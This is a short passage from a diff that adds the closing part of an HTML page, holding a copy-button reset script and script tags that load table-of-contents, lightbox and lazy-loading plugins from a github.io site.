+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
